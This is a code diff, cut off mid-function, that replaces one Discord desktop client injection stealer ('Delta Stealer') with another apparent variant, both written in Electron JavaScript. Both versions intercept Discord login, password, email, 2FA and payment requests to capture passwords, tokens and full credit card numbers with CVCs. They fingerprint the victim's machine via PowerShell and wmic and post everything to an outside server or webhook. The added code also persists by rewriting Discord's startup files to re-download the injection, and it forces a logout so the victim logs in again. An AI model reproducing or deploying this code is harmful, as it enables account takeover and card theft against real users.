@@ -1,928 +1,276 @@
-const {
-    BrowserWindow,
-    session,
-} = require('electron');
-const os = require('os');
-const https = require('https');
-const querystring = require("querystring");
-const fs = require("fs");
+const { BrowserWindow, session } = require('electron'),
+    { execSync } = require("child_process"),
+    { parse } = require("querystring"),
+    path = require("path"),
+    fs = require("fs");
 
+let [ID, WEBHOOK] = ["%ID_REQUEST%", "%WEBHOOK%"];
 
+const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;", "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js"];
 
-var config = {
-    brand: "Delta Stealer",
-
-    webhook: '%WEBHOOK%',
-
-    logout: true,
-    disable_qr_code: true,
-
-    notify_on_logout: true,
-    notify_on_initialization: true,
-    ping: [true, "@everyone"],
-
-    embed: {
-        username: "Delta Injection",
-        footer: {
-            text: `Delta Injection"`,
-            icon_url: 'https://cdn.dribbble.com/users/1087454/screenshots/5755938/untitled2.gif'.replace(/ /g, '%20'),
-        },
-        href: "https://github.com/ZekromDev & https://github.com/xTyzenDev ",
-        avatar_url: 'https://cdn.dribbble.com/users/1087454/screenshots/5755938/untitled2.gif'.replace(/ /g, '%20'),
-    },
-
-    badges: {
-        Discord_Employee: {
-            Value: 1,
-            Emoji: "<:staff:874750808728666152>",
-            Rare: true,
-        },
-        Partnered_Server_Owner: {
-            Value: 2,
-            Emoji: "<:partner:874750808678354964>",
-            Rare: true,
-        },
-        HypeSquad_Events: {
-            Value: 4,
-            Emoji: "<:hypesquad_events:874750808594477056>",
-            Rare: true,
-        },
-        Bug_Hunter_Level_1: {
-            Value: 8,
-            Emoji: "<:bughunter_1:874750808426692658>",
-            Rare: true,
-        },
-        Early_Supporter: {
-            Value: 512,
-            Emoji: "<:early_supporter:874750808414113823>",
-            Rare: true,
-        },
-        Bug_Hunter_Level_2: {
-            Value: 16384,
-            Emoji: "<:bughunter_2:874750808430874664>",
-            Rare: true,
-        },
-        Early_Verified_Bot_Developer: {
-            Value: 131072,
-            Emoji: "<:developer:874750808472825986>",
-            Rare: true,
-        },
-        House_Bravery: {
-            Value: 64,
-            Emoji: "<:bravery:874750808388952075>",
-            Rare: false,
-        },
-        House_Brilliance: {
-            Value: 128,
-            Emoji: "<:brilliance:874750808338608199>",
-            Rare: false,
-        },
-        House_Balance: {
-            Value: 256,
-            Emoji: "<:balance:874750808267292683>",
-            Rare: false,
-        }
-    },
-
-    filters: {
-        user: {
-            urls: [
-                "https://discord.com/api/v*/users/@me",
-                "https://discordapp.com/api/v*/users/@me",
-                "https://*.discord.com/api/v*/users/@me",
-                "https://discordapp.com/api/v*/auth/login",
-                'https://discord.com/api/v*/auth/login',
-                'https://*.discord.com/api/v*/auth/login',
-                "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
-                "https://api.stripe.com/v*/tokens",
-                "https://api.stripe.com/v*/setup_intents/*/confirm",
-                "https://api.stripe.com/v*/payment_intents/*/confirm",
-            ]
-        },
-        qr_codes: {
-            urls: [
-                "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
-                "https://*.discord.com/api/v*/applications/detectable",
-                "https://discord.com/api/v*/applications/detectable",
-                "https://*.discord.com/api/v*/users/@me/library",
-                "https://discord.com/api/v*/users/@me/library",
-                "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
-                "https://discord.com/api/v*/users/@me/billing/subscriptions",
-                "wss://remote-auth-gateway.discord.gg/*"
-            ]
-        }
-    }
-}
-
-var execScript = (script) => {
-    const window = BrowserWindow.getAllWindows()[0]
-    return window.webContents.executeJavaScript(script, true);
-}
-
-class Event {
-    constructor(event, token, data) {
-        for (let [key, value] of Object.entries({
-                "event": event,
-                "data": data,
-                "token": token
-            })) {
-            this[key] = value;
-        }
-    }
-
-    handle() {
-        switch (this["event"]) {
-            case "passwordChanged":
-                event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
-                break;
-            case 'userLogin':
-                event_handlers["userLogin"](this.data.password, this.data.email, this.token)
-                break;
-            case 'emailChanged':
-                event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
-                break;
-            case "creditCardAdded":
-                event_handlers["creditCardAdded"](this.data.number, this.data.cvc, this.data.exp_month, this.data.exp_year, this.token);
-        }
-    }
-}
-
-// Traffic recording (Pirate stealer inspiration)
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    try {
-        if (details.url.startsWith(config.webhook)) {
-            if (details.url.includes("discord.com")) {
-                callback({
-                    responseHeaders: Object.assign({
-                        'Access-Control-Allow-Headers': "*"
-                    }, details.responseHeaders)
-                });
-            } else {
-                callback({
-                    responseHeaders: Object.assign({
-                        "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-                        'Access-Control-Allow-Headers': "*",
-                        "Access-Control-Allow-Origin": "*"
-                    }, details.responseHeaders)
-                });
+function send(e, d) {
+    return new Promise((resolve, reject) => {   
+        const url = `https:\/\/aurita\.onrender\.com\/request\/${ID == "%ID" + "_REQUEST%" ? "k4itrun" : ID}\/${e}`.replace("\\", "");
+        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`fetch("${url}", ${JSON.stringify({
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain',
+                'Access-Control-Allow-Origin': '*',
+                'authorization': WEBHOOK,
+            },
+            body: JSON.stringify(d),
+        })})`).then(r => {
+            if (r.ok) {
+                resolve(r.json());
             }
-        } else {
-            delete details.responseHeaders['content-security-policy'];
-            delete details.responseHeaders['content-security-policy-report-only'];
-
-            callback({
-                responseHeaders: {
-                    ...details.responseHeaders,
-                    'Access-Control-Allow-Headers': "*"
-                }
-            })
-        }
-
-    } catch {}
-})
-
-session.defaultSession.webRequest.onBeforeRequest(config.filters["qr_codes"], async (details, callback) => {
-    if (details.url.startsWith("wss://")) {
-        if (!config.disable_qr_code == false) {
-            callback({
-                cancel: true
-            })
-            return;
-        }
-    }
-
-    await initialize();
-
-    callback({})
-    return;
-})
-
-session.defaultSession.webRequest.onCompleted(config.filters["user"], async (details, callback) => {
-    try {
-        if (details.statusCode == 200 || details.statusCode == 204) {
-            const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-            const data = JSON.parse(unparsed_data)
-            const token = await getToken();
-
-            switch (true) {
-                case details.url.endsWith('login'):
-                    (new Event('userLogin', token, {
-                        password: data.password,
-                        email: data.login
-                    })).handle();;
-                    return;
-                case details.url.endsWith("tokens") && details.method == "POST":
-                    const item = querystring.parse(unparsed_data.toString());
-                    (new Event('creditCardAdded', token, {
-                        number: item["card[number]"],
-                        cvc: item["card[cvc]"],
-                        exp_month: item["card[exp_month]"],
-                        exp_year: item["card[exp_year]"],
-                    }))
-
-                case details.url.endsWith('users/@me') && details.method == 'PATCH':
-                    if (!data.password) return;
-                    if (data.email) {
-                        (new Event('emailChanged', token, {
-                            password: data.password,
-                            email: data.email
-                        })).handle();
-                    };
-                    if (data.new_password) {
-                        (new Event('passwordChanged', token, {
-                            password: data.password,
-                            new_password: data.new_password
-                        })).handle();
-                    };
-                    return;
-                default:
-                    break;
-            }
-        } else {
-            return;
-        }
-
-    } catch {}
-})
-
-// ==================================================================================
-
-var event_handlers = {
-
-    async creditCardAdded(number, cvc, month, year) {
-        const userInfo = await getUserInfo(token);
-        const billing = await getBilling(token);
-        const friends = await getRelationships(token);
-
-        var params = {
-            username: config.embed.username,
-            avatar_url: config.embed.avatar_url,
-            embeds: [createEmbed({
-                title: "Discord | Credit card added",
-                url: config.embed.href,
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                fields: [{
-                        name: "Credit card Number",
-                        value: `\`\`\`${number}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Credit card CVC",
-                        value: `\`\`\`${cvc}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Credit card expiration",
-                        value: `\`\`\`${month}/${year}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Nitro",
-                        value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
-                    }, {
-                        name: "Billing",
-                        value: `${billing}`,
-                        inline: true
-                    }, {
-                        name: "Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: false
-                    },
-                    {
-                        name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
-                    },
-                ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-            })]
-        }
-		const hexToAscii = (hex) => {
-    const ascii = [];
-    for (let i = 0; i < hex.length; i += 2) {
-        ascii.push(String.fromCharCode(parseInt(hex.substr(i, 2), 16)));
-    }
-    return ascii.join('');
-};
-
-
-try {
-
-    await client.axios_instance({
-        url: webhook,
-        method: "POST",
-        data: {
-            username: config.embed.username,
-            avatar_url: config.embed.avatar_url,
-            embeds: [{
-                title: "Discord | Credit card added",
-                url: config.embed.href,
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                fields: [{
-                        name: "Credit card Number",
-                        value: `\`\`\`${number}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Credit card CVC",
-                        value: `\`\`\`${cvc}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Credit card expiration",
-                        value: `\`\`\`${month}/${year}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Nitro",
-                        value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
-                    }, {
-                        name: "Billing",
-                        value: `${billing}`,
-                        inline: true
-                    }, {
-                        name: "Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: false
-                    },
-                    {
-                        name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
-                    },
-                ],
-            }]
-        },
+        }).catch(e => {
+            reject(e);
+        });
     });
-} catch (error) {
-    console.error('Error sending data to the webhook:', error);
 }
 
-        sendToWebhook(params)
-    },
-
-    async userLogin(password, email, token) {
-        const userInfo = await getUserInfo(token);
-        const billing = await getBilling(token);
-        const friends = await getRelationships(token);
-
-        var params = {
-            username: config.embed.username,
-            avatar_url: config.embed.avatar_url,
-            embeds: [createEmbed({
-                title: "Discord | User logged in",
-                url: config.embed.href,
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                fields: [{
-                        name: "Password",
-                        value: `\`\`\`${password}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "E-Mail Address",
-                        value: `\`\`\`${email}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Nitro",
-                        value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
-                    }, {
-                        name: "Billing",
-                        value: `${billing}`,
-                        inline: true
-                    }, {
-                        name: "Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: false
-                    },
-                    {
-                        name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
-                    },
-                ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-            })]
-        }
-
-        sendToWebhook(params)
-    },
-
-    async emailChanged(password, newEmail, token) {
-        var userInfo = await getUserInfo(token);
-        var billing = await getBilling(token);
-        var friends = await getRelationships(token);
-
-        var params = {
-            username: config.embed.username,
-            avatar_url: config.embed.avatar_url,
-            embeds: [createEmbed({
-                title: "Discord | Email changed",
-                url: config.embed.href,
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                fields: [{
-                        name: "New email address",
-                        value: `\`\`\`${newEmail}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Password",
-                        value: `\`\`\`${password}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Nitro",
-                        value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
-                    }, {
-                        name: "Billing",
-                        value: `${billing}`,
-                        inline: true
-                    }, {
-                        name: "Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: false
-                    },
-                    {
-                        name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
-                    },
-                ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-            })]
-        }
-
-        sendToWebhook(params)
-    },
-
-    async passwordChanged(oldPassword, newPassword, token) {
-        var userInfo = await getUserInfo(token);
-        var billing = await getBilling(token);
-        var friends = await getRelationships(token);
-
-        var params = {
-            username: config.embed.username,
-            avatar_url: config.embed.avatar_url,
-            embeds: [createEmbed({
-                title: "Discord | Password changed",
-                url: config.embed.href,
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                fields: [{
-                        name: "Old password",
-                        value: `\`\`\`${oldPassword}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "New password",
-                        value: `\`\`\`${newPassword}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Nitro",
-                        value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
-                    }, {
-                        name: "Billing",
-                        value: `${billing}`,
-                        inline: true
-                    }, {
-                        name: "Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: false
-                    },
-                    {
-                        name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
-                    },
-                ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-            })]
-        }
-
-        sendToWebhook(params)
-    },
-}
-
-
-function getDiscordClient() {
-    return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
-}
-
-function getNitro(flags) {
-    switch (flags) {
-        case 0:
-            return "\`\`\`No Nitro\`\`\`";
-        case 1:
-            return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
-        case 2:
-            return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
-        case 3:
-            return "<:classic:896119171019067423> \`\`Nitro Basic\`\`";
-        default:
-            return "\`\`\`No Nitro\`\`\`";
-
-    };
-}
-
-function getRareBadges(flags) {
-    var b = '';
-    for (const prop in config.badges) {
-        let o = config.badges[prop];
-        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
-    };
-    return b;
-}
-
-function getBadges(flags) {
-    var b = '';
-    for (const prop in config.badges) {
-        let o = config.badges[prop];
-        if ((flags & o.Value) == o.Value) b += o.Emoji;
-    };
-    if (b == '') b = '\`\`\`None\`\`\`'
-    return b;
-}
-
-async function getToken() {
-    return await execScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
-}
-
-async function getIp() {
-    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://ipinfo.io/json", false );xmlHttp.send( null );xmlHttp.responseText;`, true));
-}
-
-async function getUserInfo(token) {
-    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, true));
-}
-
-async function getBilling(token) {
-    var a = await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, true)
-    var json = JSON.parse(a)
-
-    var billing = "";
-    json.forEach(z => {
-        if (z.type == "") {
-            return "\`\`\`❌\`\`\`";
-        } else if (z.type == 2 && z.invalid != true) {
-            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
-        } else if (z.type == 1 && z.invalid != true) {
-            billing += "\`✔️\`" + " :credit_card:";
-        } else {
-            return "\`\`\`❌\`\`\`";
+function cruise(a, b, c, d) {
+    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`
+          var xmlHttp = new XMLHttpRequest();
+          xmlHttp.open("GET", "https://www.myexternalip.com/raw", false);
+          xmlHttp.send(null);
+          xmlHttp.responseText;
+      `, true).then((ip) => {
+        const RAW_DATA = {
+            WIN_PRODUCT_VERSION: (execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName").toString().split("\r\n")[0]),
+            MAC_ADDRESS: (execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0]),
+            CPU_COUNT: (execSync("echo %NUMBER_OF_PROCESSORS%").toString().trim()),
+            LOCAL_IP: (execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0]),
+            PC_NAME: (execSync("hostname").toString().trim()),
+            INJECT: (__dirname.toString().trim().replace(/\\/g, "/")),
+            UUID: (execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0]),
+            RAM: (parseInt(execSync('powershell "Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object -ExpandProperty Sum"', { encoding: 'utf-8' }).trim()) / (1024 * 1024 * 1024)).toFixed(2) + " GB",
+            CPU: (execSync("wmic cpu get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, "")),
+            GPU: (execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, "")),
+            OS: (execSync("wmic OS get caption, osarchitecture | more +1").toString().trim()),
         };
+        switch (a) {
+            case 'LOGIN_USER':
+                let x = {
+                    IP: ip,
+                    TYPE: d,
+                    TOKEN: b,
+                    PASSWORD: c['password'] ? c['password'] : "",
+                    ...RAW_DATA
+                }
+                if (c['code']) {
+                    x.CODE = c['code']
+                }
+                send("login", x);
+                break;
+            case "USERNAME_CHANGED":
+                send("username", {
+                    IP: ip,
+                    TOKEN: b,
+                    PASSWORD: c['password'],
+                    NEW_USERNAME: c['username'],
+                    ...RAW_DATA
+                });
+                break;
+            case 'EMAIL_CHANGED':
+                send("email", {
+                    IP: ip,
+                    TOKEN: b,
+                    PASSWORD: c['password'],
+                    NEW_EMAIL: c['email'],
+                    ...RAW_DATA
+                });
+                break;
+            case 'PASSWORD_CHANGED':
+                send("password", {
+                    IP: ip,
+                    TOKEN: b,
+                    OLD_PASSWORD: c['password'],
+                    NEW_PASSWORD: c['new_password'],
+                    ...RAW_DATA
+                });
+                break;
+            case 'CREDITCARD_ADDED':
+                send("creditcard", {
+                    IP: ip,
+                    TOKEN: b,
+                    NUMBER: c['card[number]'],
+                    DATE: `${c['card[exp_month]']}:${c['card[exp_year]']}`,
+                    CVC: c['card[cvc]'],
+                    DATA: c,
+                    ...RAW_DATA
+                });
+                break;
+            case 'PAYPAL_ADDED':
+                send("paypal", {
+                    IP: ip,
+                    TOKEN: b,
+                    EMAIL: c['email'],
+                    PASSWORD: c['password'],
+                    NEW_PAYPAL: "done",
+                    ...RAW_DATA
+                });
+                break;
+            case 'MFA_ENABLED':
+                send("mfae", {
+                    IP: ip,
+                    TOKEN: b,
+                    PASSWORD: c['password'],
+                    CODE: c['code'],
+                    SECRET_KEY: c['secret'],
+                    ...RAW_DATA
+                });
+                break;
+            case "INJECTED":
+                send("injected", {
+                    IP: ip,
+                    TOKEN: b,
+                    ...RAW_DATA
+                });
+                break;
+            default:
+        }
     });
-
-    if (billing == "") billing = "\`\`\`❌\`\`\`"
-    return billing;
 }
 
-async function getRelationships(token) {
-    var a = await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, true)
-    var json = JSON.parse(a)
-    const r = json.filter((user) => {
-        return user.type == 1
-    })
-    var rareBadgesFriends = "";
-    for (z of r) {
-        var b = getRareBadges(z.user.public_flags)
-        if (b != "") {
-            rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
-        }
+const DISCORD_PATH = (function () {
+    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep); 
+    let resource;
+    if (process.platform === 'win32') {
+        resource = path.join(app, 'resources');
+    } else if (process.platform === 'darwin') {
+        resource = path.join(app, 'Contents', 'Resources');
     }
-    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"
+    if (fs.existsSync(resource)) return { resource, app };
+    return { undefined, undefined };
+})();
 
-    return {
-        length: r.length,
-        frien: rareBadgesFriends
+async function updateCheck() {
+    const { resource, app } = DISCORD_PATH;
+    if (resource === undefined || app === undefined) return;
+    let p = path.join(resource, 'app');
+    if (!fs.existsSync(p)) fs.mkdirSync(p);
+    if (fs.existsSync(path.join(p, 'package.json'))) fs.unlinkSync(path.join(p, 'package.json'));
+    if (fs.existsSync(path.join(p, 'index.js'))) fs.unlinkSync(path.join(p, 'index.js'));
+    if (process.platform === 'win32' || process.platform === 'darwin') {
+        fs.writeFileSync(path.join(p, 'package.json'), JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
+        fs.writeFileSync(path.join(p, 'index.js'), `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar')}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, 'app.asar')}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, '\\\\'));
     }
+    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return;
+    fs.rmdirSync(path.join(__dirname, 'initiation'));
+
+    // ALERT !!
+    let token = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true);
+    cruise('INJECTED', token);
+
+    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(LOGOUT_SCRIPT, true);
 }
 
+session.defaultSession.webRequest.onBeforeRequest({
+    'urls': [
+        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
+        'https://*.discord.com/api/v*/applications/detectable',
+        'https://discord.com/api/v*/applications/detectable',
+        'https://*.discord.com/api/v*/users/@me/library',
+        'https://discord.com/api/v*/users/@me/library',
+        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
+        'https://discord.com/api/v*/users/@me/billing/subscriptions',
+        'wss://remote-auth-gateway.discord.gg/*',
+        'https://discord.com/api/v*/auth/sessions',
+        'https://*.discord.com/api/v*/auth/sessions',
+        'https://discordapp.com/api/v*/auth/sessions'
+    ]
+}, (a, callback) => {
+    if (!fs.existsSync(`${__dirname}/aurathemes`)) {
+        fs.mkdirSync(`${__dirname}/aurathemes`);
+    }
+    if (!fs.existsSync(`${__dirname}/aurathemes/${ID}.txt`)) {
+        fs.writeFileSync(`${__dirname}/aurathemes/${ID}.txt`, WEBHOOK);
